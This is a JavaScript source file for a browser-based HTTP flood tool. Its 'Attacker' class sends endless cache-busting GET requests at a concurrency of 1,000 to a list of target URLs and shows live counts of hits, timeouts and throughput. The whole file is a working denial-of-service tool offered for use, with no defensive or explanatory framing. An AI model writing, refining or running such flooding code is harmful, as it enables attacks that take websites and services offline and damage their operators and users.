const generate = (num) => Math.random().toString(36).slice(num);

export default class Attacker {
  constructor(targets) {
    this.targets = targets;
    this.concurrency = 1000;
    this.queue = [];
    this.statsEl = document.getElementById('stats');
    this.stats = {
      success: 0,
      errors: 0,
      timeout: 0,
      throughput: 0,
      elapsedTime: 0,
      startTime: Date.now(),
    };
    this.targetStats = {};

    this.init();
  }

  init() {
    this.targets.forEach((target) => {
      this.targetStats[target] = {
        requests: 0,
        hits: 0,
      };
    });

    setInterval(this.printStats.bind(this), 200);
  }

  go() {
    this.targets.map(this.flood.bind(this));
  }

  calcThroughput() {
    this.stats.throughput++;
    setTimeout(() => {
      this.stats.throughput--;
    }, 60000);
  }

  printStats() {
    this.stats.elapsedTime = (Date.now() - this.stats.startTime) / 1000;

    this.statsEl.innerHTML = `
      <dl>
        <dt>Total run time</dt>
        <dd id="stats_running_time">${`${
          this.stats.elapsedTime === 0
            ? 'Not started'
            : this.stats.elapsedTime.toFixed(2)
        } seconds`}</dd>
        <dt>Hits</dt>
        <dd id="stats_errored_requests">${
          this.stats.errors
        } requests came back</dd>
        <dt>Timeouts</dt>
        <dd id="stats_blocked_requests">${this.stats.timeout}</dd>
        <dt>Total Requests</dt>
        <dd id="stats_total_requests">${
          this.stats.timeout + this.stats.errors + this.stats.success
        }</dd>
        <dt>Throughput (per minute)</dt>
        <dd id="stats_throughput">${this.stats.throughput}</dd>
      </dl>
        ${
          '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Hits</th></tr></thead><tbody>' +
          Object.entries(this.targetStats)
            .map(
              ([target, { requests, hits }]) =>
                '<tr><td>' +
                target +
                '</td><td>' +
                requests +
                '</td><td>' +
                hits +
                '</td></tr>'
            )
            .join('') +
          '</tbody></table>'
        }

   `;
  }

  async fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
      method: 'GET',
      mode: 'no-cors',
      signal: controller.signal,
    })
      .then((response) => {
        clearTimeout(id);
        return response;
      })
      .catch((error) => {
        clearTimeout(id);
        throw error;
      });
  }

  async flood(targetUrl) {
    for (var i = 0; ; ++i) {
      if (this.queue.length > this.concurrency) {
        await this.queue.shift();
      }
      this.queue.push(
        this.fetchWithTimeout(`${targetUrl}/?${generate(2)}${generate(2)}`, {
          timeout: 5000,
        })
          .catch((error) => {
            if (error.code === 20) {
              this.stats.timeout++;
              return;
            }
            this.targetStats[targetUrl].hits++;
            this.stats.errors++;
          })
          .then((response) => {
            if (response && !response.ok) {
              this.stats.errors++;
              this.targetStats[targetUrl].hits++;
            }
            this.targetStats[targetUrl].requests++;
          })
          .finally(() => {
            this.calcThroughput();
          })
      );
    }
  }
}
